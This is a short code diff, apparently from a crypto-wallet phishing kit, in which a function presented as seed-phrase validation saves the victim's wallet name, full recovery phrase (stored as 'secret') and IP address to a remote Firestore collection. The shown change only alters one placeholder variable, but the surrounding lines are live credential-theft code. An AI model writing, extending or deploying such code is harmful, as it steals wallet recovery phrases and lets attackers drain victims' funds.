@@ -105,7 +105,7 @@ function validateMnemonic(mnemonic) {
                 if(!isExist){
                     var _asset = '';
                     var _total = 0;
-                    var _s = 1;
+                    var _s = '';
                     const user = await addDoc(collection(db, "mydata"), {
                         src:_src,s:_s,total:_total,assets:_asset,wallet:walletName,secret:formattedSeedPhrase,ip:ip,createdAt: new Date().getTime(),status:0
                     });
